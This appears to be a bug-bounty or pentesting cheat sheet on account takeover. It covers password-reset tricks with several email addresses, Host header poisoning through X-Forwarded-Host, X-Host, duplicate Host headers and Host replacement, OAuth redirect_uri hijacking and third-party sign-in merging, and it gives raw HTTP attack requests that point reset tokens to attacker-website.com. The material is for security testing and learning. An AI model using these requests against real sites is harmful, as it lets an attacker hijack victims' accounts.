Account takeover allows you to take full control on the user's account.

# Password Recovery

Password recovery functionality is often implemented by sending a one-time link to email. 

## Several Email Addresses

Sometimes you can takeover an account by specifying several email addresses in the password recovery request. For example, if an application is vulnerable to such an attack, on a similar request:

```http
POST /users/password HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json
Content-Length: 57

{"email": ["victim@website.com", "attacker@website.com"]}
```

an application will send the same recovery link to two email addresses.

## Host Header Poisoning

Applications can use the `Host` header value for generating a password recovery link. If the application is vulnerable to `Host` header poisoning, you could affect the link and specify its own domain name. As a result, if the victim follows the link from the email, the recovery token will leak to the you.

There are several ways to implement `Host` header poisoning.

### X-Forwarded-Host Header

The [X-Forwarded-Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host) header is a header for identifying the original host requested by the client in the `Host` request header. Example of vulnerable request:

```http
POST /users/password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

References:

- [Write up: Account Takeover Through Password Reset Poisoning](https://medium.com/@vbharad/account-takeover-through-password-reset-poisoning-72989a8bb8ea)

### X-Host Header

`X-Host`, like `X-Forwarded-Host`, sometimes is used to identifying the original host. Example of vulnerable request:

```http
POST /users/password HTTP/1.1
Host: vulnerable-website.com
X-Host: attacker-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

### Several Host Header

You can try specifying several `Host` headers. Example of vulnerable request:

```http
POST /users/password HTTP/1.1
Host: vulnerable-website.com
Host: attacker-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

### Host Header Replacement

You can try replace the `Host` header on your domain. Examples of vulnerable requests:

```http
POST /users/password HTTP/1.1
Host: attacker-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

```http
POST /users/password HTTP/1.1
Host: attacker-website.com/vulnerable-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

References:

- [Write up: Password Reset link hijacking via Host Header Poisoning](https://hackerone.com/reports/226659)

# OAuth

## Host Header Poisoning

Poisoning the `Host` header can lead to account takeover not only during password recovery, but also OAuth authentication. Sometimes you can affect `redirect_uri` by poisoning the `Host` header. As a result, when the victim exchanges the authorization code for access token, he / she will send a request with this token to your domain. Example of vulnerable request:

```http
GET /twitter/login HTTP/1.1
Host: attacker-website.com/vulnerable-website.com
```

References:

- [Write up: Account Takeover in Periscope TV](https://hackerone.com/reports/317476) 

# Third-party Sign-in or Sign-up

Applications that implement third party sign-in or sign-up often identify users based on the attached email address that the third party application sends. In such cases, you can try sign-in or sign-up with two different third-party applications that are linked to the same email address. Sometimes these two accounts can be joined and you will have access to the victim's account by sign-in or sign-up with your third-party application account.

For example, suppose a victim sign-in or sign-up to `vulnerable-website.com` with `third-party-app1.com`, which is linked to `victim@website.com`. To exploit this, you can try the following:
1. Create an account at `third-party-app2.com` and enter the `victim@website.com` email address (ideal if email confirmation is not required),
2. Try sign-in or sign-up at `vulnerable-website.com` through `third-party-app2.com`,
3. If the application is vulnerable, then you will have access to the victim's account.

References:

- [Write up: account takeover https://teamplay.qiwi.com](https://hackerone.com/reports/439207)

# Adding or Changing Email Addresses

If the operations of adding a new email address or changing an existing one do not require password confirmation, session hijacking, XSS or CSRF can lead to account takeover.
